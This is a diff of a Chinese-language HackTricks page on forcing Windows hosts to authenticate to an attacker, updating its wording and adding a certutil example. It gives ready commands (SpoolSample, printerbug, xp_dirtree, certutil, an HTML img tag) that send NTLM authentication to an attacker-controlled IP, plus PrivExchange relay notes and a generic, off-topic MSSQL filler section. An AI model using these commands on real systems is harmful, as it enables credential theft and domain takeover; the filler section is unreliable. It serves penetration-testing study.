@@ -7,8 +7,8 @@
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
 
@@ -23,7 +23,7 @@
 
 ### 在域上查找Windows服务器
 
-使用PowerShell获取Windows机器的列表。服务器通常是优先级较高的，所以我们重点关注这些服务器：
+使用PowerShell获取Windows服务器列表。通常情况下，服务器是优先级较高的，所以我们将重点关注这些服务器：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -40,7 +40,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### 请求服务对任意主机进行身份验证
 
-您可以从[这里编译**SpoolSample**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
+您可以从[这里](https://github.com/NotMedic/NetNTLMtoSilverTicket)编译**SpoolSample**。
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -59,15 +59,15 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ## PrivExchange
 
-`PrivExchange`攻击是由于Exchange Server的`PushSubscription`功能中的一个缺陷而导致的，该功能允许**任何具有邮箱的域用户强制Exchange服务器对客户端提供的任何主机进行身份验证**。
+`PrivExchange`攻击是由于Exchange Server的`PushSubscription`功能中的一个缺陷导致的，该功能允许**任何具有邮箱的域用户强制Exchange服务器对客户端提供的任何主机进行身份验证**。
 
-Exchange服务以**SYSTEM**身份运行，并且默认情况下**权限过高**（即，在2019年累积更新之前具有对域的WriteDacl权限）。可以利用此缺陷来**中继到LDAP并转储域NTDS数据库**。如果无法中继到LDAP，则可以利用此缺陷中继和对域内的**其他主机进行身份验证**。此攻击将使您直接成为具有任何经过身份验证的域用户帐户的域管理员。
+Exchange服务以**SYSTEM**身份运行，并且默认情况下**权限过高**（即，在2019年累积更新之前具有对域的WriteDacl权限）。可以利用此缺陷来**中继到LDAP并转储域NTDS数据库**。如果无法中继到LDAP，则可以利用此缺陷中继和对域内的**其他主机进行身份验证**。此攻击将使您可以使用任何经过身份验证的域用户帐户直接访问域管理员。
 
 ****[**此技术的来源在此。**](https://academy.hackthebox.com/module/143/section/1276)****
 
 ## 在Windows内部
 
-如果您已经在Windows机器内部，可以使用特权帐户强制Windows连接到服务器：
+如果您已经在Windows机器内部，可以使用特权帐户强制Windows连接到服务器，方法如下：
 
 ### Defender MpCmdRun
 ```bash
@@ -75,61 +75,47 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```
 ### MSSQL
 
-MSSQL（Microsoft SQL Server）是一种关系型数据库管理系统，常用于存储和管理大量数据。它是由微软开发的，具有强大的功能和高性能。
+MSSQL（Microsoft SQL Server）是一种关系型数据库管理系统，常用于存储和管理大量数据。它是由微软开发的，广泛应用于企业和组织的数据管理中。
 
-#### MSSQL注入攻击
+MSSQL具有强大的功能和安全性，但在配置不当的情况下，可能会存在安全漏洞。黑客可以利用这些漏洞来获取未经授权的访问权限，并对数据库进行恶意操作。
 
-MSSQL注入攻击是一种常见的网络攻击技术，通过利用应用程序对MSSQL数据库的不正确处理，攻击者可以执行恶意的SQL查询，从而获取敏感数据或者对数据库进行破坏。
+以下是一些常见的MSSQL攻击技术：
 
-#### MSSQL注入攻击的防御措施
+1. **SQL注入攻击**：黑客通过在应用程序的输入字段中插入恶意SQL代码，来执行未经授权的数据库操作。这可以导致数据泄露、数据篡改或拒绝服务攻击。
 
-为了防止MSSQL注入攻击，可以采取以下措施：
+2. **弱密码攻击**：黑客使用暴力破解或字典攻击等方法，尝试猜解MSSQL数据库的管理员密码。如果管理员使用弱密码，黑客可以轻松获取对数据库的完全控制权。
 
-- 使用参数化查询或预编译语句，确保输入的数据被正确地转义和验证。
-- 限制数据库用户的权限，避免使用具有过高权限的账户。
-- 定期更新和修补MSSQL服务器，以防止已知的漏洞被利用。
-- 监控数据库的日志，及时发现异常行为并采取相应的应对措施。
+3. **未经授权的访问**：黑客可以通过利用MSSQL服务器上的安全漏洞，绕过身份验证机制，获取对数据库的未经授权访问权限。这可能导致数据泄露、数据篡改或拒绝服务攻击。
 
-#### MSSQL漏洞利用工具
+为了保护MSSQL数据库免受攻击，以下是一些建议的安全措施：
 
-以下是一些常用的MSSQL漏洞利用工具：
+1. **更新和修补**：定期更新和修补MSSQL服务器，以确保安装了最新的安全补丁和修复程序。
 
-- **sqlmap**：一款功能强大的自动化SQL注入和数据库接管工具。
-- **MSSQLPwn**：一款专门用于MSSQL服务器的渗透测试工具，可以执行各种攻击，如注入、提权等。
-- **Metasploit**：一款广泛使用的渗透测试框架，其中包含了许多用于MSSQL漏洞利用的模块。
+2. **强密码策略**：使用强密码，并定期更改密码。避免使用常见的密码，如生日、姓名或简单的数字序列。
 
-#### MSSQL安全加固建议
+3. **访问控制**：限制对MSSQL服务器的访问权限，并仅授权给需要访问数据库的用户。
 
-为了提高MSSQL服务器的安全性，可以采取以下措施：
+4. **安全审计**：启用MSSQL服务器的安全审计功能，以便监控和记录对数据库的访问和操作。
 
-- 使用强密码保护MSSQL服务器的登录凭证。
-- 禁用不必要的服务和功能，减少攻击面。
-- 定期备份数据库，并将备份文件存储在安全的位置。
-- 使用防火墙限制对MSSQL服务器的访问。
-- 定期审计和监控MSSQL服务器的活动，及时发现异常行为。
+5. **网络安全**：使用防火墙和入侵检测系统来保护MSSQL服务器免受网络攻击。
 
-#### MSSQL常见漏洞
-
-以下是一些常见的MSSQL漏洞：
-
-- **SQL注入漏洞**：允许攻击者执行恶意的SQL查询，从而获取敏感数据或者对数据库进行破坏。
-- **弱密码漏洞**：使用弱密码保护MSSQL服务器的登录凭证，容易被攻击者猜解或暴力破解。
-- **未经授权访问漏洞**：未正确配置访问控制，导致攻击者可以未经授权地访问MSSQL服务器。
-- **未修补漏洞**：未及时更新和修补MSSQL服务器，使得已知的漏洞可以被攻击者利用。
-
-#### MSSQL安全审计
-
-MSSQL安全审计是一种对MSSQL服务器进行全面检查和评估的过程，旨在发现潜在的安全风险和漏洞，并提供相应的修复建议。通过进行安全审计，可以提高MSSQL服务器的安全性，并保护敏感数据免受攻击。
+通过采取这些安全措施，可以大大减少MSSQL数据库受到攻击的风险，并保护组织的数据安全。
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
 或者使用另一种技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
+### Certutil
+
+可以使用certutil.exe（Microsoft签名的二进制文件）来强制执行NTLM身份验证：
+```bash
+certutil.exe -syncwithWU  \\127.0.0.1\share
+```
 ## HTML注入
 
 ### 通过电子邮件
 
-如果你知道要入侵的机器上登录用户的**电子邮件地址**，你可以发送一封带有1x1像素图片的**电子邮件**，例如：
+如果你知道你想入侵的机器上登录用户的**电子邮件地址**，你可以发送一封带有一个1x1像素的**图片的电子邮件**，例如：
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -141,5 +127,17 @@ EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
 ## 破解NTLMv1
 
-如果你能够捕获[NTLMv1挑战，请阅读这里如何破解它们](../ntlm/#ntlmv1-attack)。\
-_请记住，为了破解NTLMv1，你需要将Responder挑战设置为"1122334455667788"_
+如果你能够捕获到[NTLMv1的挑战，请阅读这里如何破解它们](../ntlm/#ntlmv1-attack)。\
+_请记住，为了破解NTLMv1，你需要将Responder的挑战设置为"1122334455667788"_。
+
+<details>
+
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks的衍生品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+
+</details>
